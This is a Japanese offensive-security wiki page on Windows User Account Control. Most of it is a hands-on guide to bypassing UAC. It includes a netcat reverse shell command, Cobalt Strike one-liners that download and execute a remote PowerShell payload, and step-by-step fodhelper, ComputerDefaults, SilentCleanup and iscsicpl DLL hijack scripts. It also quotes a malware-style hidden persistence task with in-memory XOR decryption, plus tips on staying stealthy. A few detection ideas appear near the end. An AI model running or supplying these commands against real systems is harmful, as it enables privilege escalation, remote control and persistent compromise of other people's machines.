# UAC - ユーザーアカウント制御

{{#include ../../banners/hacktricks-training.md}}

## UAC

[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された操作に対する同意プロンプト**を表示する機能です。アプリケーションには異なる `integrity` レベルがあり、**高レベル**のプログラムは、**システムを危険にさらす可能性のあるタスク**を実行できます。UAC が有効な場合、管理者がアプリケーションやタスクにシステムへの管理者レベルのアクセスを明示的に許可しない限り、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行**されます。これは、意図しない変更から管理者を守るための利便性機能ですが、セキュリティ境界とは見なされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つのトークンが付与されます。通常の操作を medium integrity で実行するための標準ユーザートークンと、admin 権限を持つトークンです。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の仕組みについて詳しく説明しています。<sup>[[2]](#references)</sup> 管理者は、ローカルレベル (secpol.msc を使用) で組織に応じた UAC の動作をセキュリティポリシーで設定できます。または、Active Directory ドメイン環境で Group Policy Objects (GPO) を通じて設定し、適用することもできます。各種設定の詳細は[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で説明されています。UAC には設定可能な Group Policy 設定が 10 個あります。次の表に詳細を示します。

| Group Policy 設定                                                                                                                                                                                                                                                                                                                                                           | レジストリキー                | デフォルト設定                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [ユーザーアカウント制御: 組み込み Administrator アカウントの Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [ユーザーアカウント制御: Admin Approval Mode の管理者に対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (セキュリティで保護されたデスクトップで、Windows 以外のバイナリに対する同意を求める) |
| [ユーザーアカウント制御: 標準ユーザーに対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (セキュリティで保護されたデスクトップで資格情報を求める)         |
| [ユーザーアカウント制御: アプリケーションのインストールを検出して昇格を求める](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効。Enterprise ではデフォルトで無効)           |
| [ユーザーアカウント制御: 署名され検証された実行可能ファイルのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [ユーザーアカウント制御: 安全な場所にインストールされた UIAccess アプリケーションのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [ユーザーアカウント制御: すべての管理者を Admin Approval Mode で実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [ユーザーアカウント制御: UIAccess アプリケーションがセキュリティで保護されたデスクトップを使用せずに昇格を求めることを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [ユーザーアカウント制御: 昇格を求める際にセキュリティで保護されたデスクトップに切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [ユーザーアカウント制御: ファイルやレジストリへの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows へのソフトウェアインストールに関するポリシー

**ローカルセキュリティポリシー** (ほとんどのシステムでは「secpol.msc」) は、デフォルトで**非管理者ユーザーによるソフトウェアのインストールを禁止する**ように設定されています。つまり、非管理者ユーザーがソフトウェアのインストーラーをダウンロードできても、admin アカウントなしでは実行できません。

### UAC に昇格を求めさせるレジストリキー

admin 権限を持たない標準ユーザーは、「標準」アカウントが特定の操作を実行しようとした際に、UAC に**資格情報を求めさせる**ことができます。この操作には特定の**レジストリキー**の変更が必要であり、admin 権限が必要です。ただし、**UAC bypass** がある場合や、攻撃者がすでに admin としてログインしている場合は除きます。

ユーザーが **Administrators** グループに属していても、これらの変更により、管理操作を実行するには**アカウントの資格情報を再入力**する必要があります。

**実際には、昇格されたトークン、UAC bypass、またはこれらのキーを変更できる設定ミスがすでにある場合にのみ役立ちます。それ以外の場合、レジストリへの書き込み自体がブロックされます。**

変更する必要があるレジストリキーとエントリは次のとおりです (括弧内はデフォルト値)。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で設定することもできます。変更後、管理操作を実行する際に資格情報の再入力が求められます。

### 注意

**User Account Control はセキュリティ境界ではありません。** したがって、標準ユーザーは local privilege escalation exploit なしにアカウントから抜け出し、管理者権限を得ることはできません。

### ユーザーに「コンピューターへの完全なアクセス」を求める

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC 権限

- Internet Explorer Protected Mode は整合性チェックを使用し、高い整合性レベルのプロセス（Web ブラウザーなど）が、低い整合性レベルのデータ（一時インターネットファイルフォルダーなど）にアクセスするのを防ぎます。これは、ブラウザーを低い整合性レベルのトークンで実行することで実現します。ブラウザーが低い整合性レベルのゾーンに保存されたデータにアクセスしようとすると、オペレーティングシステムがプロセスの整合性レベルを確認し、それに応じてアクセスを許可します。この機能により、リモートコード実行攻撃がシステム上の機密データにアクセスするのを防ぎます。
- ユーザーが Windows にログオンすると、システムはユーザーの権限の一覧を含むアクセストークンを作成します。権限は、ユーザーの権利と機能の組み合わせとして定義されます。トークンにはユーザーの資格情報の一覧も含まれており、これらの資格情報は、コンピューターやネットワーク上のリソースに対してユーザーを認証するために使用されます。

### Autoadminlogon

Windows の起動時に特定のユーザーを自動的にログオンさせるには、**`AutoAdminLogon` レジストリキー**を設定します。これはキオスク環境やテスト目的で便利です。レジストリにパスワードが露出するため、安全なシステムでのみ使用してください。

レジストリエディターまたは `reg add` を使用して、次のキーを設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

通常のログオン動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> 被害者の画面を操作できる場合、UAC bypass は簡単です。UAC プロンプトが表示されたら「はい」をクリックするだけです。

UAC bypass が必要となるのは、**UAC が有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが Administrators グループに属している場合**です。

**最高のセキュリティレベル（Always）では、他のレベル（Default）よりも UAC bypass がはるかに困難**であることに注意してください。

### 中程度の整合性レベルのシェルからの迅速なトリアージ

bypass を試す前に、適切な状況にあることを確認し、ホストのビルドに対応する既知の動作する手法を調べます。

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

実用上の注意:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token から high integrity を直接要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM ベースの bypasses でよく見られるシナリオです。
- `Always Notify` はハードルを上げますが、失敗すると決めつけず、対象の build で実際にテストしてください。UACME は、最新の Windows build でも `AlwaysNotify compatible` な手法をいくつか追跡しています。<sup>[[3]](#references)</sup>

### UAC が無効の場合

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）なら、次のような方法で admin privileges を持つ reverse shell（high integrity level）を **実行できます**。

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + 再利用可能な debug object

AppInfo の local RPC インターフェース `201ef99a-7fa0-444c-9399-19ba84f12a1a` は、debug を有効にしてプロセスを作成できます。同じスレッド上で debug により作成されたプロセスは、そのスレッドの debug object を共有します。作成時の debug event には、RPC の結果自体が制限付きアクセスしか許可しない場合でも、フルアクセスのプロセスハンドルが含まれます。これにより、Administrators グループに属する medium-integrity ユーザーが、debug object の再利用を UAC primitive として利用できます。<sup>[[11]](#references)[[12]](#references)</sup>

実用的な chain は次のとおりです。<sup>[[11]](#references)[[12]](#references)</sup>

1. local RPC メソッド（直接または `NdrAsyncClientCall` 経由）を呼び出し、debug を有効にして非昇格の使い捨てプロセスを作成する。
2. `NtQueryInformationProcess` で `ProcessDebugObjectHandle` を問い合わせ、`NtRemoveProcessDebug` で切り離して object を保持し、使い捨てプロセスを終了する。
3. 同じ RPC インターフェースを使って、信頼された auto-elevated プロセスを作成し、`DbgUiSetThreadDebugObject` を通じて保存した object を呼び出し元のスレッドに関連付ける。
4. `WaitForDebugEvent` を呼び出して `CREATE_PROCESS_DEBUG_EVENT` のプロセスハンドルを取得し、続行前に `NtDuplicateObject` で複製する。
5. 複製したハンドルを `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` に渡し、拡張 startup-info 構造体を使って payload を起動する。これにより、昇格したプロセスのコンテキストを再利用しつつ、子プロセスに信頼されているように見える親プロセス関係を与えられる。

auto-elevated binary だけでなく、短い一連の動作を探してください。local AppInfo RPC によるプロセス作成、`ProcessDebugObjectHandle` の問い合わせ、debugger の detach/reattach、直後の creation-debug event、ハンドルの複製、および記録された親プロセスが作成 API を実行したプロセスと一致しない子プロセスに注目します。<sup>[[12]](#references)</sup>

### **ごく**基本的な UAC「bypass」（ファイルシステムへの完全なアクセス）

Administrators グループに属するユーザーの shell がある場合、SMB（ファイルシステム）経由で共有されている **C$ を新しいディスクにローカルでマウント**すれば、**ファイルシステム内のすべてのものにアクセスできます**（Administrator のホームフォルダーも含む）。

> [!WARNING]
> **この手法はもう機能しないようです**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt StrikeによるUAC bypass

Cobalt Strikeの手法は、UACが最高のセキュリティレベルに設定されていない場合にのみ機能します。

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire**と**Metasploit**には、**UAC**を**bypass**するためのモジュールもいくつかあります。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objectsは、最新ビルドでも実用的なUAC attack surfaceとして残っています。`ICMLuaUtil`は、現在のWindowsブランチでも動作するとUACMEで追跡されています。また、攻撃ツールでは、インタラクティブなデスクトッププロセスと64-bit実行を組み合わせ、場合によってはCOM Elevation Monikerを呼び出す前にPEB/process masqueradingを行うことで、`CMSTPLUA`への対応が続けられています。<sup>[[3]](#references)</sup>

実践的なヒント:
- ユーザーの**interactive session**で、**64-bit**プロセスを優先してください（通常は`explorer.exe`またはその子プロセス）。
- raw shellで失敗した場合は、単純な`CreateProcess`ラッパーではなく、BOF / UACME実装から再試行してください。
- 子プロセスは**別の昇格プロセス**として実行されることを想定してください。多くのBOFは、現在のbeaconをその場で昇格させません。

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)にあるドキュメントとツール

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME)は、UAC bypass techniquesのコレクションです。Visual StudioまたはMSBuildでコンパイルしてください。ビルドによって複数の実行ファイル（例: `Source\Akagi\output\x64\Debug\Akagi.exe`）が作成されるため、対象のビルドに適したmethodを選択してください。<sup>[[3]](#references)</sup>\
注意してください。一部のbypassは、ユーザーに気づかれる可能性のある表示プログラムやプロンプトを起動します。<sup>[[3]](#references)</sup>

UACMEには、各techniqueが動作し始めた**build version**が記載されています。<sup>[[3]](#references)</sup>対象のバージョンに影響するtechniqueを検索できます:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

また、[こちら](https://en.wikipedia.org/wiki/Windows_10_version_history)のページを使うと、ビルドバージョンから Windows リリース `1607` がわかります。

実践的なワークフローでは、まず**ホストのビルドを評価**してから、対応する手法を実行します。

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` はローカルのビルドを既知の UAC methods とすばやく照合できるため、使えなくなった PoC を早く除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME` は、bypass を正確なビルドに対応付けるための、現在も最良の公開カタログです。Version 3.7.1 では methods 83–85 が追加され、その前のリリースでは既存の methods が **Windows 11 25H2** で再テストされました。古い PoC が変更なしで今も使えると決めつけず、method table と release notes を再確認してください。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify に対応する WNF/UIAccess チェーン（UACME 3.7.1）

`Always Notify` でも、すべての UAC bypass を防げるわけではありません。UACME 3.7.1 では、ユーザーが制御できる環境変数やプロトコルの状態と、昇格された scheduled-task または UIAccess の動作を組み合わせた、3 つの新しい x64 methods が実装されており、すべて `AlwaysNotify compatible` とされています。<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` をリダイレクトし、WNF によって起動される `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` に、昇格された `taskhostw.exe` から `unifiedconsent.dll` を side-load させます。UACME では Windows 10 build 19041 以降が対象です。
- **84 — TabTip:** 同じ環境変数の手法を UIAccess の `TabTip.exe` に適用します。ビルドに応じて `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll`、または `rsaenh.dll` が読み込まれ、その後、得られた high-integrity の UIAccess コンテキストから次の段階へ移ります。UACME では Windows 8.1 / Server 2016 以降が対象です。
- **85 — Narrator:** ユーザーごとの `feedback-hub` プロトコルを hijack し、`Alt+CapsLock+F` で Narrator を操作した後、書き込み可能な `osk.exe` のコピーを起動して `OskSupport.dll` を side-load させます。対話型デスクトップが必要で、UACME では Windows 10 1809 / Server 2019 以降が対象です。

UACME のドキュメントに従って payload units と Akagi をビルドした後、対応する method number を指定して実行します（省略可能なコマンドの既定値は `cmd.exe` です）。

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Method 84と85はUIAccess/desktop interactionに依存するため、Session 0や非対話型のservice shellから変更なしで動作するとは限りません。いずれも環境/protocol stateを操作し、DLLを配置するため、実装を確認し、テスト後にそれらのartifactを削除してください。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリ`fodhelper.exe`は、最新のWindowsではauto-elevateされます。起動すると、以下のユーザーごとのレジストリパスを`DelegateExecute` verbの検証なしに照会します。そこにコマンドを仕込むことで、Medium Integrity process（ユーザーがAdministratorsグループに属している場合）から、UAC promptなしでHigh Integrity processを起動できます。

fodhelperが照会するレジストリパス：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShellの手順（payloadを設定してから実行）</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
注意:
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルト/緩和設定の場合に動作します（追加の制限がある Always Notify では動作しません）。
- 64-bit Windows 上で 32-bit プロセスから 64-bit PowerShell を起動するには、`sysnative` パスを使用してください。
- Payload には任意のコマンド（PowerShell、cmd、または EXE のパス）を指定できます。ステルス性を保つには、プロンプトを表示する UI は避けてください。

#### `ComputerDefaults.exe` による同じ `ms-settings` ハンドラーのトリガー

`ComputerDefaults.exe` は、`fodhelper.exe` と同じ per-user の `ms-settings\Shell\Open\command` 関連付けを解決します。<sup>[[13]](#references)[[14]](#references)</sup> 上記のデフォルトコマンドと空の `DelegateExecute` 値を設定した後、代替トリガーとして `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` を使用してください。レジストリの設定を繰り返す必要はありません。<sup>[[13]](#references)[[14]](#references)</sup> 上記の `fodhelper.exe` の注意事項にある、medium-integrity の管理者と UAC ポリシーの前提条件は引き続き適用されます。<sup>[[2]](#references)[[3]](#references)</sup> UACME では、このトリガーは Windows 10 RS4（build 17134）から掲載されているため、対象の build で動作を確認してください。<sup>[[3]](#references)</sup>

#### CurVer/extension hijack variant（HKCU のみ）

`fodhelper.exe` を悪用する最近のサンプルは、`DelegateExecute` を使わず、per-user の `CurVer` 値を介して **`ms-settings` ProgID をリダイレクト**します。auto-elevated バイナリは引き続き `HKCU` の下にあるハンドラーを解決するため、キーを仕込むのに管理者トークンは必要ありません。<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

昇格後、malwareは一般に `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後、追加の defense evasion（例：`Add-MpPreference -ExclusionPath C:\ProgramData`）を行い、高い整合性レベルで実行されるよう persistence を再作成します。典型的な persistence task では、**XORで暗号化されたPowerShellスクリプト**をディスクに保存し、1時間ごとにメモリ内で復号して実行します。<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

この variant も dropper をクリーンアップし、staged payload だけを残すため、検知は **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の改ざん、Defender exclusion の作成、またはメモリ内で PowerShell を復号する scheduled task の監視に頼ることになります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は最高権限で `cleanmgr.exe` を起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できれば、その展開先を任意の command にリダイレクトし、同意ダイアログなしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME ではこの technique が引き続き有効であり、最近の issue の追跡状況から、Windows 11 24H2 では quoting の小さな調整だけで済む可能性があるため、最近のビルドでもこの方法を試す価値があります。<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

ビルドによっては、タスクがパスを引用符で囲んでいる場合、末尾に引用符を付けた payload（例: `cmd.exe"`）で再試行してください。テスト後は必ず `HKCU\Environment\windir` を削除してください。

#### UAC bypass の追加手法

UI フロー、COM オブジェクト、またはデスクトップ操作を悪用する従来の UAC bypass の多くは、victim の**完全な対話型セッション**が必要です。一般的な `nc.exe` shell や **Session 0** で実行されているサービスだけでは不十分な場合がよくあります。

多くの場合、**meterpreter** セッションを使って解決できます。**Session** の値が **1** の**プロセス**に移行してください。

![ms-settings をカスタム拡張子 (.thm) に指定し、その拡張子を payload に関連付ける - UAC bypass の追加手法: meterpreter セッションを使えます。Session... の値を持つプロセスに移行してください。](<../../images/image (863).png>)

(_explorer.exe_ が動作するはずです)

### GUI による UAC Bypass

**GUI にアクセスできる場合、UAC prompt が表示されたときに承認するだけで済みます**。技術的な bypass は実際には必要ありません。そのため、GUI セッションを取得するだけで、UAC によって生じる実際上の障害を回避できることがよくあります。

さらに、誰かが使用していた GUI セッション（RDP 経由の可能性もあります）を取得した場合、**administrator として実行されているツール**があり、UAC の再確認なしに、そこから**管理者として**直接 **cmd** などを**実行**できることがあります。たとえば [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) です。こちらのほうが**ステルス性**に優れる場合があります。

### ノイズの多い brute-force UAC bypass

ノイズが許容される場合、[**ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなツールを使って、ユーザーが承認するまで昇格を繰り返し要求できます。

### 独自の bypass - UAC bypass の基本的な手法

**UACME** を見ると、**多くの UAC bypass が DLL hijacking を悪用している**ことがわかります（多くの場合、昇格されたバイナリに、書き込み可能なパスにある攻撃者制御の DLL を読み込ませます）。[DLL hijacking の脆弱性を見つける方法はこちらを参照してください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate** するバイナリを見つけます（実行時に高い integrity level で動作することを確認します）。
2. procmon で、**DLL Hijacking** に悪用できる "**NAME NOT FOUND**" イベントを探します。
3. 書き込み権限がない**保護されたパス**（C:\Windows\System32 など）に DLL を**書き込む**必要がある場合があります。次の方法で回避できます。
   1. **wusa.exe**: Windows 7、8、8.1。高い integrity level で実行されるため、CAB ファイルの内容を保護されたパス内に展開できます。
   2. **IFileOperation**: Windows 10。
4. DLL を保護されたパスにコピーし、脆弱な autoelevated バイナリを実行する**スクリプト**を用意します。

### 別の UAC bypass 手法

**autoElevated binary** が、実行する**バイナリ**や**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとするか**を確認する方法です（その情報を **HKCU** 内から探すバイナリなら、特に興味深い手法です）。

### `SysWOW64\iscsicpl.exe` とユーザー `PATH` による DLL hijack を使った UAC bypass

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は**自動昇格する**バイナリであり、検索順序を利用して `iscsiexe.dll` を読み込ませることができます。**ユーザーが書き込み可能な**フォルダーに悪意のある `iscsiexe.dll` を配置し、現在のユーザーの `PATH`（たとえば `HKCU\Environment\Path` 経由）を変更してそのフォルダーが検索されるようにすると、Windows は **UAC prompt を表示せずに**、昇格された `iscsicpl.exe` プロセス内で攻撃者の DLL を読み込む可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実践上の注意:
- 現在のユーザーが **Administrators** グループに属している一方、UAC により **Medium Integrity** で実行されている場合に役立ちます。
- この bypass で対象となるのは **SysWOW64** 側のコピーです。**System32** 側のコピーは別のバイナリとして扱い、動作を個別に検証してください。
- この手法は**自動昇格**と**DLL の検索順序を利用した hijacking**を組み合わせたものです。そのため、他の UAC bypass と同じ ProcMon の手順で、DLL の読み込みが見つからないことを検証できます。

最小限の手順:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

検知のアイデア:
- `reg add` / レジストリへの書き込みで `HKCU\Environment\Path` を変更した直後に、`C:\Windows\SysWOW64\iscsicpl.exe` が実行された場合にアラートを出す。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` などの**ユーザーが制御可能な**場所にある `iscsiexe.dll` を探す。
- `iscsicpl.exe` の起動と、想定外の子プロセスや通常の Windows ディレクトリ外からの DLL 読み込みを関連付ける。

### 個別に確認する価値のある新しい研究

2024年以降の一部のチェーンは、従来の `HKCU\Software\Classes` レジストリ hijack とは異なる仕組みになっています。たとえば、activation-context cache poisoning では、**drive remap** と **DLL redirection** を組み合わせ、`ctfmon.exe` などの信頼された UI / auto-elevated バイナリや、後続のターゲットである `fodhelper.exe` を介して、medium integrity から high integrity へ移行できます。ここに長大な PoC を重複して掲載する代わりに、次の簡潔な payload の例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview): per-logon-session DOS device map を介したドライブレター hijack

> [!NOTE]
> 2026年8月時点で、Microsoft は引き続き Administrator Protection を**Insider preview**として案内しています。2025年10月の展開は取り消され、後日再開される予定です。これらのチェーンをテストする前に、**Admin Approval Mode with Administrator protection** が実際に有効であり、デバイスが再起動済みであることを確認してください。stock の 25H2 バージョン文字列だけでは、この機能が有効である証拠にはなりません。<sup>[[10]](#references)</sup>

Windows 11 25H2 preview builds における `RAiLaunchAdminProcess` / UIAccess の攻撃対象領域全体については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

